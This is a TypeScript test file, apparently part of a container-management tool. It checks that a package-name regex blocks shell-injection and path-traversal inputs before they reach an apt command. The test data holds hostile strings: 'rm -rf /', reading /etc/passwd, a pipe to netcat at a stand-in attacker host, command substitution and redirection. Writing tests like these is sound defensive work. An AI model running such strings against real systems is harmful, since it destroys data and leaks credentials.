/**
 * Security-shaped: `install_package` interpolates the package name directly
 * into a `sh -c` string passed to `exec_container`, so the
 * `PACKAGE_NAME_PATTERN` guard is the ONLY thing keeping a malicious caller
 * from achieving shell injection through the container's apt invocation.
 * Lock the regex's accept / reject behavior here so a future "improvement"
 * (e.g., relaxing to allow whitespace, slashes, semicolons) can't silently
 * re-open the hole.
 */
import { describe, it, expect } from 'vitest';
import { install_package } from '../../../src/podman.js';

/**
 * Capture and classify whatever `install_package` does on the supplied input.
 * Returns whether the regex guard fired (`regex_rejected: true`) — that's the
 * security contract the test is locking. Valid inputs reach the real
 * `exec_container` call which fails with "no such container" against the
 * synthetic container name; that's fine — anything OTHER than the regex
 * rejection counts as "the guard accepted the input".
 */
function probe_guard(package_name: string): { regex_rejected: boolean; thrown_message: string } {
    try {
        install_package('synthetic-container-not-real', package_name);
        return { regex_rejected: false, thrown_message: '' };
    } catch (error) {
        const message = error instanceof Error ? error.message : String(error);
        return {
            regex_rejected: /Debian package naming convention/.test(message),
            thrown_message: message,
        };
    }
}

describe('install_package — PACKAGE_NAME_PATTERN security guard', () => {
    describe('rejects shell-injection-shaped inputs', () => {
        const malicious_inputs: readonly [string, string][] = [
            ['semicolon command separator', 'foo; rm -rf /'],
            ['ampersand backgrounding', 'foo & cat /etc/passwd'],
            ['pipe to another command', 'foo | nc attacker 1234'],
            ['command substitution dollar', 'foo$(whoami)'],
            ['command substitution backtick', 'foo`whoami`'],
            ['newline injection', 'foo\nrm -rf /'],
            ['double-quote escape', 'foo"bar'],
            ['single-quote escape', "foo'bar"],
            ['redirection write', 'foo > /etc/passwd'],
            ['redirection append', 'foo >> /etc/passwd'],
            ['space-separated extra arg', 'foo bar'],
        ];

        it.each(malicious_inputs)('rejects %s: %s', (_label, malicious) => {
            const probe = probe_guard(malicious);
            expect(probe.regex_rejected).toBe(true);
        });
    });

    describe('rejects path-traversal-shaped inputs', () => {
        it.each([
            ['parent-directory traversal', '../etc/passwd'],
            ['absolute-path-shaped name', '/bin/sh'],
            ['forward-slash separator', 'foo/bar'],
        ])('rejects %s: %s', (_label, malicious) => {
            const probe = probe_guard(malicious);
            expect(probe.regex_rejected).toBe(true);
        });
    });

    describe('rejects malformed names', () => {
        it.each([
            ['empty string', ''],
            ['leading dot (Debian disallows)', '.foo'],
            ['leading dash (would be parsed as an apt flag)', '-y'],
            ['uppercase letters', 'Foo'],
            ['leading underscore', '_foo'],
        ])('rejects %s: %s', (_label, malicious) => {
            const probe = probe_guard(malicious);
            expect(probe.regex_rejected).toBe(true);
        });
    });

    describe('accepts valid Debian package names', () => {
        const valid_names = [
            'git',
            'curl',
            'libssl3',
            'postgresql-client-16',
            'python3.11',
            'gcc-12',
            'libstdc++6',
            'g++',
            'a',
            '7zip',
        ];

        // The guard accepted the input iff the regex error did NOT fire. The
        // downstream `exec_container` call will then fail against the
        // synthetic non-existent container; that failure is expected and
        // unrelated to the security contract.
        it.each(valid_names)('accepts %s', (valid) => {
            const probe = probe_guard(valid);
            expect(probe.regex_rejected).toBe(false);
        });
    });
});
